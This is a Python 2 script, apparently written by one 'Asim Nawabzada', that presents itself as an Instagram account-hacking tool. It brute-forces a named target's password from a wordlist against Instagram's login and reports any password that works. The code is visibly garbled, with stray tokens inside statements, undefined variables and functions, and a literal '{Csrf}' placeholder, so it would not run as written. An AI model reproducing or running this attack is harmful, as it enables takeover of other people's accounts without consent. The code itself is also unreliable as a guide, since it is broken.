 usr/bin/python2
# Author : ASIMNAWABZADA

from requests.excepti ons import ConnectionError 
from cookielib import LWPCookieJar as Cookie
from bs4 import BeautifulSoup
import requests, random, time, sys, os, re

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

def Asimnawabzada(s):
	for x in s + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(random.random() * 0.01)
		
def Banner():
	os.system('clear')
	Nawabzada(''+C+'''
▇◤▔▔▔▔▔▔▔◥▇
▇▏◥▇◣┊◢▇◤▕▇
▇▏▃▆▅▎▅▆▃▕▇
▇▏╱▔▕▎▔▔╲▕▇
▇◣◣▃▅▎▅▃◢◢▇
▇▇◣◥▅▅▅◤◢▇▇
▇▇▇◣╲▇╱◢▇▇▇
▇▇▇▇◣▇◢▇▇▇▇
   '''+W+'Creator : Asim\n\t\t   : Nawabzada')
                
def Tool():
	os.system('clear')
	Banner()
	print
	print
	try:
	
		Username =Asim raw_input(W+'Instagram Target Username: '+C+'')
		List_Pass = raw_input(W+'Type> (nawabzada.txt)   : '+C+'')
		print
		Nawabzada(''+C+'-------------- '+W+'Starting'+C+' --------------')
		print
	
		Open_List = open(List_Pass).readlines()
	
		for Pass in Open_List:
		
			Password =Asim str(Pass.strip().split('\n')[0])
		
			Search_User = 'https://instagram.com/' + Username
			Get_User = requests.get(Search_User)
		
			if 'alternateName' in Get_User.text:
				pass
		
			else:
				print(M+'User Serch stop !')
				sys.exit()
			
			Url = 'https://www.instagram.com'
		
			GetUrl = requests.get(Url)
			Soup = BeautifulSoup(GetUrl.text, 'html.parser')
			Csrf = Soup.find_all('script', {'type' : 'text/javascript'})[3].text[46:78]
		
			headers = {
			'X-CSRFToken' : '{Csrf}',
			'Referer' : 'https://www.instagram.com/accounts/login/'
			}
		
			data = {
			'username' : Username,
			'password' : Password
			}
		
			Cookies = Cookie('.cookieslog')
		
			Sess = requests.Session()
			Sess.cookies = Cookies
			Sess.headers = headers
		
			Log = Sess.post(UrlLogin, data = data, allow_redirects = True)
			Sess.headers.update({'X-CSRFToken' : '{Csrf}'})
		
			In = Sess.get(Url, allow_redirects=True)
			if 'biography' in In.text:
				print(W+'[   '+H+'Found'+W+'   ]'+C+' Username : '+W+Username+C+' Password :Asim '+W+Password)
				Sess.cookies.save()
				sys.exit()
			
			else:
				print(W+'[ '+A+'Not Found'+W+' ]'+C+' Username : '+W+Username+C+' Password : '+W+Password)

	except ConnectionError:
		print(M+'connection error !')
		sys.exit()
	
	except IOError:
		print(M+'File List Password No Add !')
		sys.exit()
	
def Log_In():
	os.system('clear')
	print(W+'\t ['+H+'\xE2\x9C\x9A'+W+'] LOG IN TOOL'+W+'['+H+'\xE2\x9C\x9A'+W+']')
	AsimNawabzada(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	print
	AsimNawabzada(C+'Log In \Username & Password\nOwner    : '+W+'AsimNawabzada'+C+'\nWhatsApp : '+W+'+447466909922')
	print
	AsimNawabzada(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	username = 'Asim'
	password = 'Nawabzada'

	print
	usr = raw_input(W+'USERNAME : '+C+'')

	if usr.upper() == username:
		pass
		
	elif not usr.upper() == username:
		print
		print(M+'Username  \xE2\x9C\x96')
		sys.exit()
	
	pwd = raw_input(W+'PASSWORD : '+C+'')

	if pwd.upper() == password:
		print
		print(W+'Log In Sucses'+H+' \xE2\x9C\x94')
		time.sleep(2)
		Tool()
	
	elif not pwd.upper() == password:
		print
		print(M+'Password  \xE2\x9C\x96')
		sys.exit()
		
def AsimHacker():
	os.system('clear')
	print(W+'   ['+H+'\xE2\x9C\x9A'+W+'] Welcome ASIMHACKERSSQUAD Tool'+W+'['+H+'\xE2\x9C\x9A'+W+']')
	ASIMKHAN(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	print
        print(W+'['+H+'1'+W+']'+C+' Start Instagram Hacking')
	print(W+'['+H+'2'+W+']'+C+' Subscribe Channel AsimNawabzada')
	print(W+'['+H+'3'+W+']'+C+' WhatsApp Group')
	print
	ASIMKHAN(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	print
	Choose = input(W+'select -> '+C+'')

	if Choose == 1:
		Tool()

	elif Choose == 2:
		print
		(C+'YouTube Channel '+W+' ...')
		time.sleep(1.5)
		os.system('xdg-open https://wa.me/447466909922 ')
		AsimKhan()
	
	elif Choose == 3:
		print
		AsimKhan(C+'WhatsApp Group'+W+' ...')
		time.sleep(1.5)
		os.system('xdg-open https://wa.me/447466909922 ')  
		ASIMKHAN()

if __name__ == '__main__':
	ASIMNAWABZADA()
